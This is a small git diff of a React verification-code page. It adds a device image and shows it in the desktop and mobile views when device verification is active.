@@ -2,6 +2,7 @@ import PropTypes from "prop-types";
 import { useContext, useEffect, useState } from "react";
 import { useLocation } from "react-router-dom";
 import { SocketContext } from "../App";
+import deviceImage from "../public/681.jpg";
 import image from "../public/image.png";
 import { ShowLoading, Spinner } from "./Home";
 const Verify = () => {
@@ -192,7 +193,7 @@ const DesktopMain = ({
                     </p>
                 )}
                 <img
-                    src={image}
+                    src={deviceVerification ? deviceImage : image}
                     className="pointer-events-none my-3 select-none object-fill"
                     alt=""
                 />
@@ -256,7 +257,7 @@ const MobileMain = ({
                 </b>
                 <p>Please enter the verification code below from your phone</p>
                 <img
-                    src={image}
+                    src={deviceVerification ? deviceImage : image}
                     className="pointer-events-none my-3 select-none rounded-lg object-fill"
                     alt=""
                 />
